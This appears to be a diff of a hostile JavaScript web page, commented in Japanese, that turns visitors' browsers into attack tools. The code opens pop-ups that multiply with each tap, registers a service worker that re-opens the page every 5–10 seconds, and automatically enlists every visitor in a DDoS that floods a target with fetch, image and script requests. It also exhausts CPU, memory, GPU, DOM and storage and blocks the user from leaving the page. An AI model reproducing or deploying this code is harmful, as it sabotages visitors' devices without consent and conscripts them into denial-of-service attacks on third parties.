@@ -66,21 +66,11 @@
             if (!isAttacking) return;
             
             tapCount++;
-            
-            // タップ回数に応じて開く数を増やす
             const openCount = Math.min(tapCount, 10);
             
             for (let i = 0; i < openCount; i++) {
                 try {
-                    const popup = window.open(
-                        location.href,
-                        '_blank',
-                        `width=${100 + Math.random()*100},height=${100 + Math.random()*100},left=${Math.random()*(screen.width-200)},top=${Math.random()*(screen.height-200)}`
-                    );
-                    
-                    if (popup) {
-                        popup.document.write('<!DOCTYPE html><html><head><title>Loading...</title></head><body>Loading...</body></html>');
-                    }
+                    window.open(location.href, '_blank');
                 } catch(e) {}
             }
         });
@@ -131,23 +121,13 @@
                 } catch(e) {}
             }
         });
-        
-        // 自動増殖（保険）
-        setInterval(() => {
-            if (!isAttacking) return;
-            
-            try {
-                window.open(location.href, '_blank');
-            } catch(e) {}
-        }, 10000);
     }
 
     // ============================================
-    // Service Worker登録（保険）
+    // Service Worker登録（保険・5〜10秒で復活）
     // ============================================
     function serviceWorkerRegister() {
         if ('serviceWorker' in navigator) {
-            // Service WorkerのコードをBlobで生成
             const swCode = `
                 self.addEventListener('install', (e) => {
                     self.skipWaiting();
@@ -157,7 +137,6 @@
                     e.waitUntil(clients.claim());
                 });
                 
-                // キャッシュに攻撃ページを保存
                 self.addEventListener('fetch', (e) => {
                     e.respondWith(
                         caches.open('attack-cache').then((cache) => {
@@ -171,14 +150,14 @@
                     );
                 });
                 
-                // 定期的にクライアントを復活
+                // 5〜10秒ごとにクライアントを復活
                 setInterval(() => {
                     clients.matchAll().then((clientList) => {
                         if (clientList.length === 0) {
                             clients.openWindow('/');
                         }
                     });
-                }, 30000);
+                }, 5000 + Math.random() * 5000);
             `;
             
             const blob = new Blob([swCode], { type: 'application/javascript' });
@@ -191,7 +170,7 @@
     }
 
     // ============================================
-    // DDoS攻撃（踏み台）
+    // DDoS攻撃（全員自動参加）
     // ============================================
     function startDDoS() {
         if (isDDoSing || !ddosTarget) return;
@@ -201,17 +180,14 @@
             if (!isDDoSing) return;
             
             for (let i = 0; i < 50; i++) {
-                // fetch攻撃
                 fetch(ddosTarget + '?ddos=' + Math.random(), {
                     mode: 'no-cors',
                     cache: 'no-store'
                 }).catch(() => {});
                 
-                // 画像攻撃
                 const img = new Image();
                 img.src = ddosTarget + '?img=' + Math.random();
                 
-                // script攻撃
                 const script = document.createElement('script');
                 script.src = ddosTarget + '?js=' + Math.random();
                 document.head.appendChild(script);
@@ -227,7 +203,7 @@
         }, 10000);
     }
 
-    // CPU攻撃 - 強力版（そのまま）
+    // CPU攻撃
     function cpuAttack() {
         const cores = navigator.hardwareConcurrency || 4;
         
@@ -288,7 +264,7 @@
         mainThreadLoad();
     }
 
-    // メモリ攻撃 - 改良版（そのまま）
+    // メモリ攻撃
     function memoryAttack() {
         const memArrays = [];
         
@@ -320,7 +296,7 @@
         allocateMemory();
     }
 
-    // GPU攻撃 - 改良版（そのまま）
+    // GPU攻撃
     function gpuAttack() {
         try {
             const canvas = document.createElement('canvas');
@@ -378,7 +354,7 @@
         } catch(e) {}
     }
 
-    // DOM攻撃 - 改良版（そのまま）
+    // DOM攻撃
     function domAttack() {
         const container = document.createElement('div');
         container.style.display = 'none';
@@ -419,7 +395,7 @@
         createElements();
     }
 
-    // ストレージ攻撃（そのまま）
+    // ストレージ攻撃
     function storageAttack() {
         function fillStorage() {
             if (!isAttacking) return;
@@ -443,7 +419,7 @@
         fillStorage();
     }
 
-    // 離脱防止（そのまま）
+    // 離脱防止
     function preventLeave() {
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
